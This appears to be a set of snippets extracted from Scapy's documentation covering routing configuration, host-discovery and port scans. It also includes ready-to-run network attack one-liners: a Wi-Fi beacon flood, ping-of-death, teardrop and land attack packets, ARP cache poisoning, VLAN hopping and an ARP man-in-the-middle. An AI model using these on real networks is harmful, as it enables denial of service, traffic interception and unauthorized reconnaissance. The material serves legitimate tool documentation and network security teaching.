# Usage snippets

Extracted from Scapy documentation source pages. These are documentation snippets, including some interactive transcript output; adapt them into clean application code before use.

## usage

Part 6. Extracted snippets; adapt transcript output into normal Python before use.

```python
# --- snippet 35: literal ---
conf.route
# output: Network         Netmask         Gateway         Iface
# output: 127.0.0.0       255.0.0.0       0.0.0.0         lo
# output: 192.168.8.0     255.255.255.0   0.0.0.0         eth0
# output: 0.0.0.0         0.0.0.0         192.168.8.1     eth0
conf.route.delt(net="0.0.0.0/0",gw="192.168.8.1")
conf.route.add(net="0.0.0.0/0",gw="192.168.8.254")
conf.route.add(host="192.168.1.1",gw="192.168.8.1")
conf.route
# output: Network         Netmask         Gateway         Iface
# output: 127.0.0.0       255.0.0.0       0.0.0.0         lo
# output: 192.168.8.0     255.255.255.0   0.0.0.0         eth0
# output: 0.0.0.0         0.0.0.0         192.168.8.254   eth0
# output: 192.168.1.1     255.255.255.255 192.168.8.1     eth0
conf.route.resync()
conf.route
# output: Network         Netmask         Gateway         Iface
# output: 127.0.0.0       255.0.0.0       0.0.0.0         lo
# output: 192.168.8.0     255.255.255.0   0.0.0.0         eth0
# output: 0.0.0.0         0.0.0.0         192.168.8.1     eth0
```

```python
# --- snippet 36: literal ---
a, b = sr(IP(dst="www.target.com")/TCP(sport=[RandShort()]*1000))
a.plot(lambda q,r: r.id)
[<matplotlib.lines.Line2D at 0x2367b80d6a0>]
```

```python
# --- snippet 37: literal ---
sendp(RadioTap()/
          Dot11(addr1="ff:ff:ff:ff:ff:ff",
                addr2="00:01:02:03:04:05",
                addr3="00:01:02:03:04:05")/
          Dot11Beacon(cap="ESS", timestamp=1)/
          Dot11Elt(ID="SSID", info=RandString(RandNum(1,50)))/
          Dot11EltRates(rates=[130, 132, 11, 22])/
          Dot11Elt(ID="DSset", info="\x03")/
          Dot11Elt(ID="TIM", info="\x00\x01\x00\x00"),
          iface="mon0", loop=1)
```

```python
# --- snippet 38: literal ---
ans, unans = sr(IP(dst="www.slashdot.org")/TCP(dport=[80,666],flags="A"))
```

```python
# --- snippet 39: literal ---
ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )
```

```python
# --- snippet 40: literal ---
ans, unans = sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)
```

```python
# --- snippet 41: literal ---
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
```

```python
# --- snippet 42: literal ---
ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )
```

```python
# --- snippet 43: literal ---
ans, unans = sr(IP(dst="192.168.1.0/24")/ICMP(), timeout=3)
```

```python
# --- snippet 44: literal ---
ans.summary(lambda s,r: r.sprintf("%IP.src% is alive") )
```

```python
# --- snippet 45: literal ---
ans, unans = sr( IP(dst="192.168.1.0/24")/TCP(dport=80,flags="S") )
```

```python
# --- snippet 46: literal ---
ans.summary( lambda s,r : r.sprintf("%IP.src% is alive") )
```

```python
# --- snippet 47: literal ---
ans, unans = sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
```

```python
# --- snippet 48: literal ---
ans.summary( lambda s,r : r.sprintf("%IP.src% is alive") )
```

```python
# --- snippet 49: literal ---
send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
```

```python
# --- snippet 50: literal ---
send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
```

```python
# --- snippet 51: literal ---
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=target, id=42, frag=48)/("X"*116))
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
```

```python
# --- snippet 52: literal ---
send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
```

```python
# --- snippet 53: literal ---
send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )
```

```python
# --- snippet 54: literal ---
send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
      /ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )
```

```python
# --- snippet 55: literal ---
# shell: $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
# shell: $ sysctl net.ipv4.ip_forward=1
# shell: $ sudo scapy
arp_mitm("192.168.122.156", "192.168.122.17")
```

```python
# --- snippet 56: literal ---
res, unans = sr( IP(dst="target")
                /TCP(flags="S", dport=(1,1024)) )
```
